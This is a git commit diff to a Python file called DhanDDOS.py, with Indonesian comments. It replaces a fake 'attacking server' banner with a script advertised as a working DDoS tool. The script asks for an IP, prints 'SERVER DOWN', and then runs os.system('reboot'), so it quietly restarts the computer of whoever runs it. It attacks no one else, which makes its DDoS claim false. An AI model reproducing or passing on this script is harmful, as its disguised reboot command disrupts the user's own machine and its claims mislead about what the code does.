9fb321fe9edb2eb2eea4cdfa6c6e0c558d1b7ad2
Dhanytakashi <129386949+Dhanytakashi@users.noreply.github.com>
2023-05-28 13:14:06 +0800

    Update DhanDDOS.py

--- DhanDDOS.py
+++ DhanDDOS.py
@@ -1,11 +1,28 @@
-#Sisanya bikin sendiri awokawok
 
-ris = """
 
-\033[35m                   ╔═══════════════════════════════════════════╗                 
-\033[35m                   ║ \033[32m- -ATTACKING SERVER  (\033[33mDhany DDOS\033[32m)- - \033[35m║
-\033[35m                   ╚═══════════════════════════════════════════╝
-"""
-print(ris)
-time.sleep(1.9)
-print ("\033[36m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(ip,port))
+
+**__TOOLS DDOS TEMBUS NASA REAL By DhanDDOS__**
+
+```py
+
+import os
+
+import sys
+
+import time
+
+print("Masukan IP Di Bawah Tod")
+
+IP = int(input("IP : "))
+
+time.sleep(1)
+
+print("SERVER DOWN DECK: ", IP)
+
+time.sleep(3)
+
+print("._.")
+
+os.system("reboot")
+
+```
